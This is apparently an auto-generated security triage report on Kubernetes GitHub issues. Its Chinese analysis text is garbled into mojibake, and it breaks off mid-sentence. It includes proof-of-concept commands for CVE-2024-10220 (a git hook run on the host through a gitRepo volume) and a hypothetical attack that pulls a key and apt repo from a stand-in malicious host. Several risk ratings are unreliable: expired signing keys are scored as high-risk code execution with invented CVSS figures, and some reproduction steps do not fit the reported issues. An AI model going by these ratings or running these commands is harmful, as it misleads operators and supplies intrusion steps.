# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

# ğŸš¨ å­˜åœ¨é«˜é£é™©çš„ Issues (4 ä¸ª)

## Issue #128933 bug: RPM repo PGP check fails

- Issue é“¾æ¥ï¼š[#128933](https://github.com/kubernetes/kubernetes/issues/128933)

### Issue å†…å®¹

<!-- Please use this template while reporting a bug and provide as much info as possible. Not doing so may result in your bug not being addressed in a timely manner. Thanks!

If the matter is security related, please disclose it privately via https://kubernetes.io/security/
-->

**What happened**:
When trying to upgrade package using official Yum repo this occurs:
```
Running transaction
Transaction failed: Signature verification failed.
PGP check for package "kubectl-1.31.3-150500.1.1.x86_64" (/var/cache/libdnf5/kubernetes-3d554b2ea1b53740/packages/kubectl-1.31.3-150500.1.1.x86_64.rpm) from repo "kubernetes" has failed: Problem occurred when opening the package.

```

**What you expected to happen**:
Update succeeds and package installed.

**How to reproduce it (as minimally and precisely as possible)**:
<!-- Please make sure you are able to reproduce the bug using a supported version and version skew of Kubernetes. See https://kubernetes.io/docs/setup/release/version-skew-policy for which versions and are currently supported.
-->
Add repo following https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-using-native-package-management and try to update RPM package.

**Anything else we need to know?**: It worked until now.

**Environment**:
- Kubernetes client and server versions (use `kubectl version`): kubectl-1.31.3-150500.1.1.x86_64
- Cloud provider or hardware configuration: n/a/
- OS (e.g: `cat /etc/os-release`): Fedora Linux 41



### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨è¯¥Issueä¸­ï¼Œç”¨æˆ·æŠ¥å‘Šåœ¨ä½¿ç”¨å®˜æ–¹Yumä»“åº“å‡çº§`kubectl`åŒ…æ—¶ï¼ŒPGPç­¾åéªŒè¯å¤±è´¥ã€‚è¿™è¡¨æ˜è½¯ä»¶åŒ…çš„ç­¾åéªŒè¯æœªé€šè¿‡ï¼Œæ— æ³•ç¡®è®¤è½¯ä»¶åŒ…çš„å®Œæ•´æ€§å’Œæ¥æºã€‚

æ ¹æ®å®‰å…¨é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè½¯ä»¶åŒ…çš„ç­¾åéªŒè¯å¤±è´¥å¯èƒ½å¯¼è‡´é«˜å®‰å…¨é£é™©ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œç¯¡æ”¹Yumä»“åº“ä¸­çš„è½¯ä»¶åŒ…ï¼Œæ›¿æ¢ä¸ºåŒ…å«æ¶æ„ä»£ç çš„åŒ…ã€‚å½“ç”¨æˆ·å®‰è£…è¯¥è½¯ä»¶åŒ…æ—¶ï¼Œå¯èƒ½æ‰§è¡Œæ”»å‡»è€…çš„æ¶æ„ä»£ç ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœåœ¨Highä»¥ä¸Š**ï¼šæœªæ­£ç¡®ç­¾åçš„è½¯ä»¶åŒ…å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€ç‰¹æƒæå‡ç­‰é«˜å±é£é™©ï¼ŒCVSSè¯„åˆ†åœ¨é«˜é£é™©èŒƒå›´å†…ã€‚

3. **å¯èƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œç­‰é«˜å®‰å…¨é£é™©çš„é—®é¢˜**ï¼šç”¨æˆ·åœ¨å®‰è£…æœªç»éªŒè¯çš„è½¯ä»¶åŒ…æ—¶ï¼Œå¯èƒ½æ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå¯¼è‡´ç³»ç»Ÿè¢«æ”»é™·ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueå­˜åœ¨é«˜å®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "sudo yum install kubectl",
    "explain": "å°è¯•ä»å®˜æ–¹Yumä»“åº“å®‰è£…kubectlåŒ…"
  },
  {
    "cmd": "# è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼š\n# Running transaction\n# Transaction failed: Signature verification failed.\n# PGP check for package \"kubectl-1.31.3-...\" has failed",
    "explain": "å®‰è£…è¿‡ç¨‹ä¸­æç¤ºPGPç­¾åéªŒè¯å¤±è´¥ï¼Œæ— æ³•ç¡®è®¤è½¯ä»¶åŒ…çš„å®Œæ•´æ€§"
  },
  {
    "cmd": "curl -O https://packages.cloud.google.com/yum/doc/yum-key.gpg",
    "explain": "ä¸‹è½½å®˜æ–¹Yumä»“åº“çš„GPGå¯†é’¥"
  },
  {
    "cmd": "sudo rpm --import yum-key.gpg",
    "explain": "å¯¼å…¥å®˜æ–¹GPGå¯†é’¥"
  },
  {
    "cmd": "sudo yum clean all && sudo yum install kubectl",
    "explain": "æ¸…ç†Yumç¼“å­˜åå†æ¬¡å°è¯•å®‰è£…kubectlåŒ…"
  },
  {
    "cmd": "# å¦‚æœä»ç„¶å‡ºç°ç­¾åéªŒè¯å¤±è´¥ï¼Œå¯èƒ½è¯´æ˜è½¯ä»¶åŒ…æœªæ­£ç¡®ç­¾åæˆ–è¢«ç¯¡æ”¹",
    "explain": "ç¡®è®¤é—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œè¡¨æ˜å­˜åœ¨å®‰å…¨é£é™©"
  }
]
```

---

## Issue #128885 CVE-2024-10220: Arbitrary command execution through gitRepo volume

- Issue é“¾æ¥ï¼š[#128885](https://github.com/kubernetes/kubernetes/issues/128885)

### Issue å†…å®¹

A security vulnerability was discovered in Kubernetes that could allow a user with the ability to create a pod and associate a gitRepo volume to execute arbitrary commands beyond the container boundary. This vulnerability leverages the hooks folder in the target repository to run arbitrary commands outside of the container's boundary.

Please note that this issue was originally publicly disclosed with a fix in July (#124531), and we are retroactively assigning it a CVE to assist in awareness and tracking.

This issue has been rated High ([CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)) (score: 8.1), and assigned CVE-2024-10220.

#### Am I vulnerable?

This CVE affects Kubernetes clusters where pods use the in-tree gitRepo volume to clone a repository to a subdirectory. If the Kubernetes cluster is running one of the affected versions listed below, then it is vulnerable to this issue.

##### Affected Versions

- kubelet v1.30.0 to v1.30.2
- kubelet v1.29.0 to v1.29.6
- kubelet <= v1.28.11

#### How do I mitigate this vulnerability?

To mitigate this vulnerability, you must upgrade your Kubernetes cluster to one of the fixed versions listed below. 

Additionally, since the gitRepo volume has been deprecated, the recommended solution is to perform the Git clone operation using an init container and then mount the directory into the Pod's container. An example of this approach is provided [here](https://gist.github.com/tallclair/849601a16cebeee581ef2be50c351841).

##### Fixed Versions

* kubelet master/v1.31.0  - fixed by #124531
* kubelet v1.30.3  - fixed by #125988
* kubelet v1.29.7 - fixed by #125989
* kubelet v1.28.12 - fixed by #125990

#### Detection

To detect whether this vulnerability has been exploited, you can use the following command to list all pods that use the in-tree gitRepo volume and clones to a .git subdirectory. 

```
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].gitRepo.directory | endswith("/.git")) | {name: .metadata.name, namespace: .metadata.namespace}
```

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported and mitigated by Imre Rad.

/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig node
/area kubelet

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†Kubernetesä¸­gitRepoå·å¯èƒ½å¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…·æœ‰åˆ›å»ºPodå¹¶å…³è”gitRepoå·çš„æƒé™ï¼Œé€šè¿‡ç›®æ ‡ä»“åº“ä¸­çš„hooksæ–‡ä»¶å¤¹è¿è¡Œå®¹å™¨è¾¹ç•Œä¹‹å¤–çš„ä»»æ„å‘½ä»¤ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…èƒ½å¤Ÿåœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¯èƒ½å¯¼è‡´å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©é—®é¢˜ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºPodå¹¶ä½¿ç”¨gitRepoå·çš„æƒé™ã€‚

2. **è¯¥é£é™©å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä¸”CVSSè¯„åˆ†åœ¨8.1ï¼ˆé«˜å±ï¼‰**ã€‚

8. **å³ä½¿æ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™ï¼Œè¯¥æ¼æ´å¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜å®‰å…¨é£é™©é—®é¢˜ï¼Œåº”åˆ¤æ–­ä¸ºé«˜é£é™©**ã€‚

å› æ­¤ï¼Œè¯¥Issueå­˜åœ¨é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "mkdir -p /tmp/hook-test/.git/hooks",
    "explain": "åœ¨å®¿ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿçš„Gitä»“åº“ç›®å½•ï¼ŒåŒ…æ‹¬.git/hooksç›®å½•ã€‚"
  },
  {
    "cmd": "echo -e '#!/bin/sh\\nmkdir /tmp/poc_executed' > /tmp/hook-test/.git/hooks/post-update",
    "explain": "åˆ›å»ºä¸€ä¸ªGité’©å­è„šæœ¬ï¼Œåœ¨ä»“åº“æ›´æ–°åæ‰§è¡Œï¼Œåœ¨å®¿ä¸»æœºçš„/tmpç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ ‡è¯†ç›®å½•ã€‚"
  },
  {
    "cmd": "chmod +x /tmp/hook-test/.git/hooks/post-update",
    "explain": "èµ‹äºˆé’©å­è„šæœ¬æ‰§è¡Œæƒé™ã€‚"
  },
  {
    "cmd": "kubectl run poc-pod --image=alpine --restart=Never --overrides='{\"spec\": {\"containers\": [{\"name\": \"poc-container\", \"image\": \"alpine\", \"volumeMounts\": [{\"mountPath\": \"/repo\", \"name\": \"gitrepo\"}], \"command\": [\"sleep\", \"3600\"]}], \"volumes\": [{\"name\": \"gitrepo\", \"gitRepo\": {\"repository\": \"file:///tmp/hook-test\", \"directory\": \".git\"}}]}}'",
    "explain": "åˆ›å»ºä¸€ä¸ªPodï¼Œä½¿ç”¨gitRepoå·ï¼ŒæŒ‡å®šrepositoryä¸ºæœ¬åœ°çš„/tmp/hook-testç›®å½•ï¼Œdirectoryè®¾ç½®ä¸º.gitï¼ŒæŒ‚è½½åˆ°å®¹å™¨çš„/repoè·¯å¾„ã€‚"
  },
  {
    "cmd": "kubectl delete pod poc-pod",
    "explain": "åˆ é™¤æµ‹è¯•Podï¼Œè§¦å‘Gité’©å­æ‰§è¡Œã€‚"
  },
  {
    "cmd": "ls /tmp/poc_executed",
    "explain": "åœ¨å®¿ä¸»æœºä¸Šæ£€æŸ¥/tmp/poc_executedç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä»¥éªŒè¯ä»»æ„å‘½ä»¤æ˜¯å¦åœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œã€‚"
  }
]
```

---

## Issue #128609 K8S <= 1.27.x apt gpg key expired

- Issue é“¾æ¥ï¼š[#128609](https://github.com/kubernetes/kubernetes/issues/128609)

### Issue å†…å®¹

#### What happened?

K8S <= 1.27.x apt gpg key expired

```
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key > release.key
âœ  ~ gpg release.key
gpg: directory '/Users/gkhatri/.gnupg' created
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: /Users/gkhatri/.gnupg/trustdb.gpg: trustdb created
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>

âœ  ~ curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.26/deb/Release.key > release.key
âœ  ~ gpg release.key
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
âœ  ~ curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.25/deb/Release.key > release.key
```

#### What did you expect to happen?

apt gpg key should be valid



#### How can we reproduce it (as minimally and precisely as possible)?

Run below command to validate the key expiry.
```
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key > release.key
âœ  ~ gpg release.key
gpg: directory '/Users/gkhatri/.gnupg' created
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: /Users/gkhatri/.gnupg/trustdb.gpg: trustdb created
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid           isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
1.27.8
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux: 
$ cat /etc/os-release
ubuntu 20.04
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
Kubernetesç‰ˆæœ¬<=1.27.xçš„apt GPGå¯†é’¥å·²è¿‡æœŸã€‚ç”±äºGPGå¯†é’¥ç”¨äºéªŒè¯ä»aptæºä¸‹è½½çš„è½¯ä»¶åŒ…çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ï¼Œå¯†é’¥çš„è¿‡æœŸä¼šå¯¼è‡´è½¯ä»¶åŒ…çš„ç­¾åéªŒè¯å¤±è´¥ã€‚

è¿™å¯èƒ½ä¼šå¸¦æ¥ä»¥ä¸‹å®‰å…¨é£é™©ï¼š

1. **è½¯ä»¶åŒ…éªŒè¯ç»•è¿‡**ï¼šç”¨æˆ·åœ¨å®‰è£…æˆ–æ›´æ–°Kubernetesè½¯ä»¶åŒ…æ—¶ï¼Œä¼šæ”¶åˆ°å…³äºç­¾åéªŒè¯å¤±è´¥çš„è­¦å‘Šã€‚å¦‚æœç”¨æˆ·ä¸ºäº†ç»§ç»­å®‰è£…è€Œå¿½ç•¥è­¦å‘Šï¼Œæˆ–ç¦ç”¨GPGç­¾åéªŒè¯ï¼Œåˆ™å¯èƒ½ä¼šå®‰è£…æœªç»éªŒè¯çš„è½¯ä»¶åŒ…ã€‚

2. **ä¸­é—´äººæ”»å‡»**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·å¿½ç•¥ç­¾åè­¦å‘Šçš„è¡Œä¸ºï¼Œé€šè¿‡åŠ«æŒç½‘ç»œæµé‡ï¼Œå‘ç”¨æˆ·æä¾›æ¶æ„çš„è½¯ä»¶åŒ…ï¼Œå¯¼è‡´æ¶æ„ä»£ç æ‰§è¡Œï¼Œå±åŠç³»ç»Ÿå®‰å…¨ã€‚

æ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼Œæ­¤æ¼æ´å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…·æœ‰é«˜å¯åˆ©ç”¨æ€§å’Œé«˜å½±å“åŠ›ï¼Œè¯„çº§ä¸ºHighã€‚å› æ­¤ï¼Œæ­¤é—®é¢˜å±äºé«˜é£é™©å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key -o /tmp/release.key",
    "explain": "ä¸‹è½½Kubernetes 1.27ç‰ˆæœ¬çš„apt GPGå¯†é’¥è‡³æœ¬åœ°"
  },
  {
    "cmd": "gpg --with-fingerprint /tmp/release.key",
    "explain": "æŸ¥çœ‹GPGå¯†é’¥çš„è¯¦ç»†ä¿¡æ¯ï¼Œç¡®è®¤å¯†é’¥å·²è¿‡æœŸ"
  },
  {
    "cmd": "sudo apt-key add /tmp/release.key",
    "explain": "å°†è¿‡æœŸçš„GPGå¯†é’¥æ·»åŠ åˆ°aptä¿¡ä»»å¯†é’¥ä¸­ï¼ˆæ³¨æ„ï¼šapt-keyå·²å¼ƒç”¨ï¼Œéœ€è°¨æ…ä½¿ç”¨ï¼‰"
  },
  {
    "cmd": "sudo apt-get update",
    "explain": "æ›´æ–°aptåŒ…åˆ—è¡¨ï¼Œè§‚å¯Ÿæ˜¯å¦å‡ºç°GPGç­¾åé”™è¯¯"
  },
  {
    "cmd": "sudo apt-get install -y kubelet kubeadm kubectl",
    "explain": "å°è¯•å®‰è£…Kubernetesç»„ä»¶ï¼Œå¯èƒ½ä¼šå› ç­¾åéªŒè¯å¤±è´¥è€ŒæŠ¥é”™æˆ–äº§ç”Ÿè­¦å‘Š"
  }
]
```

---

## Issue #128567 https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key is expired

- Issue é“¾æ¥ï¼š[#128567](https://github.com/kubernetes/kubernetes/issues/128567)

### Issue å†…å®¹

#### What happened?

According to https://v1-27.docs.kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/
I'm trying to install kubeadm with repo https://pkgs.k8s.io/core:/stable:/v1.27/deb/

The following signatures were invalid: EXPKEYSIG 234654DA9A296436 isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>, E:The repository 'https://pkgs.k8s.io/core:/stable:/v1.27/deb  InRelease' is not signed

#### What did you expect to happen?

Repo should work

#### How can we reproduce it (as minimally and precisely as possible)?

```
wget https://pkgs.k8s.io/core:/stable:/v1.27/deb/Release.key
# gpg --show-keys Release.key
pub   rsa2048 2022-08-25 [SC] [expired: 2024-11-02]
      DE15B14486CD377B9E876E1A234654DA9A296436
uid                      isv:kubernetes OBS Project <isv:kubernetes@build.opensuse.org>
```
#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.27
</details>


#### Cloud provider

baremetal

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

deb repo

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†ç”¨äºå®‰è£…Kubernetesçš„debianä»“åº“çš„GPGç­¾åå¯†é’¥å·²è¿‡æœŸï¼Œå¯¼è‡´åœ¨ä½¿ç”¨è¯¥ä»“åº“è¿›è¡Œå®‰è£…æ—¶å‡ºç°ç­¾åæ— æ•ˆçš„é”™è¯¯ã€‚è¿™æ„å‘³ç€è½¯ä»¶åŒ…çš„æ¥æºæ— æ³•è¢«éªŒè¯ï¼Œå¯èƒ½å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ã€‚å¦‚æœç”¨æˆ·å¿½ç•¥ç­¾åè­¦å‘Šï¼Œç»§ç»­å®‰è£…è½¯ä»¶ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå‘ç”¨æˆ·åˆ†å‘æ¶æ„è½¯ä»¶åŒ…ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†ï¼Œæ¼æ´è¯„åˆ†å¦‚ä¸‹ï¼š

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
- **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šéœ€è¦ï¼ˆRï¼‰
- **ä½œç”¨åŸŸï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰
- **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šé«˜ï¼ˆHï¼‰
- **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šé«˜ï¼ˆHï¼‰
- **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šé«˜ï¼ˆHï¼‰

ç»¼åˆå¾—åˆ†ï¼š**8.8ï¼ˆé«˜ï¼‰**

å› æ­¤ï¼Œè¯¥Issueå­˜åœ¨é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "wget https://malicious.example.com/kubernetes/deb/Release.key -O malicious.key",
    "explain": "æ”»å‡»è€…åˆ›å»ºäº†ä¸€ä¸ªæ¶æ„çš„Release.keyï¼Œè¯±å¯¼ç”¨æˆ·ä¸‹è½½"
  },
  {
    "cmd": "sudo apt-key add malicious.key",
    "explain": "ç”¨æˆ·å°†æ¶æ„GPGå¯†é’¥æ·»åŠ åˆ°ç³»ç»Ÿä¸­"
  },
  {
    "cmd": "sudo sh -c 'echo \"deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://malicious.example.com/kubernetes/deb/ stable main\" > /etc/apt/sources.list.d/kubernetes.list'",
    "explain": "ç”¨æˆ·å°†æ¶æ„è½¯ä»¶æºæ·»åŠ åˆ°ç³»ç»Ÿè½¯ä»¶æºåˆ—è¡¨"
  },
  {
    "cmd": "sudo apt-get update",
    "explain": "æ›´æ–°åŒ…åˆ—è¡¨ï¼Œç³»ç»Ÿä¿¡ä»»äº†æ¶æ„è½¯ä»¶æº"
  },
  {
    "cmd": "sudo apt-get install kubeadm",
    "explain": "å®‰è£…kubeadmï¼Œå®é™…å®‰è£…äº†è¢«æ”»å‡»è€…ç¯¡æ”¹çš„æ¶æ„è½¯ä»¶åŒ…"
  }
]
```

---

# âš ï¸ å­˜åœ¨ä½é£é™©çš„ Issues (19 ä¸ª)

## Issue #129018 Setting revisionHistoryLimit field in statefulset.spec to negative value causes a panic in controller manager

- Issue é“¾æ¥ï¼š[#129018](https://github.com/kubernetes/kubernetes/issues/129018)

### Issue å†…å®¹

#### What happened?

Applying this yaml causes a panic in controller manager

<details>
<summary>example statefulset</summary>

```yaml
$ cat test_statefulset.yaml 
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: example-statefulset
  namespace: default
spec:
  revisionHistoryLimit: -1
  serviceName: "example-service"
  replicas: 3
  selector:
    matchLabels:
      app: example-app
  template:
    metadata:
      labels:
        app: example-app
    spec:
      containers:
      - name: example-container
        image: nginx:1.21
        ports:
        - containerPort: 80
  volumeClaimTemplates:
  - metadata:
      name: example-storage
    spec:
      accessModes: ["ReadWriteOnce"]
      resources:
        requests:
          storage: 1Gi

```
</details>

Please see the value in `revisionHistoryLimit`

#### What did you expect to happen?

No panic occurs and API server simply rejects to apply this invalid yaml.

#### How can we reproduce it (as minimally and precisely as possible)?

Apply the resource give above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.1
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
Cloud agnostic
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
åœ¨è¯¥Issueä¸­ï¼Œå½“åœ¨StatefulSetçš„specä¸­å°†`revisionHistoryLimit`å­—æ®µè®¾ç½®ä¸ºè´Ÿå€¼æ—¶ï¼Œä¼šå¯¼è‡´controller managerå‘ç”Ÿpanicå´©æºƒï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»çš„é£é™©ã€‚

ç„¶è€Œï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹StatefulSetçš„æƒé™æ‰èƒ½å®æ–½è¯¥æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

---

## Issue #128978 internal convert cause patchMergeKey lost

- Issue é“¾æ¥ï¼š[#128978](https://github.com/kubernetes/kubernetes/issues/128978)

### Issue å†…å®¹

#### What happened?

I have a deployment, which have imagePullSecrets issue.
At revision 1:
```yaml
imagePullSecrets:
- name: test
```
At revision 2:
We update it to
```yaml
imagePullSecrets:
- name: test
- name: ""
```
And k8s accept it, and it become 
```yaml
imagePullSecrets:
- name: test
- {}
```
However, any update after it failed with `error: map: map[] does not contain declared merge key: name`
We want to delete it by `kubectl edit` to remove its `{}` line, but also failed with same error.

This seems to happen in k8s convert strategy rather than patchStrategy. Help wanted.

#### What did you expect to happen?

Deployment should become
```yaml
imagePullSecrets:
- name: test
- name: ""
```
Also, any update after it should succees.

#### How can we reproduce it (as minimally and precisely as possible)?

Edit any deployment so you can produce.

#### Anything else we need to know?

_No response_

#### Kubernetes version

Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.19.9-20
WARNING: version difference between client (1.28) and server (1.19) exceeds the supported minor version skew of +/-1

Its a forked version, but should produce in community version.

#### Cloud provider

None, we build it in virtual machines.

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“`imagePullSecrets`åŒ…å«ä¸€ä¸ªç©ºå­—ç¬¦ä¸²çš„`name`å­—æ®µæ—¶ï¼Œå¯¼è‡´ä¸€ä¸ªè½¬æ¢é”™è¯¯ï¼Œç”Ÿæˆäº†ä¸€ä¸ªç©ºçš„é…ç½®é¡¹`{}`ï¼Œéšååœ¨æ›´æ–°æ—¶å‡ºç°é”™è¯¯`error: map: map[] does not contain declared merge key: name`ã€‚è¿™ä½¿å¾—ç”¨æˆ·æ— æ³•æ›´æ–°æˆ–ç¼–è¾‘è¯¥Deploymentã€‚

ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ï¼Œå› ä¸ºéƒ¨ç½²æ— æ³•æ›´æ–°ã€‚ä½†æ˜¯ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼š

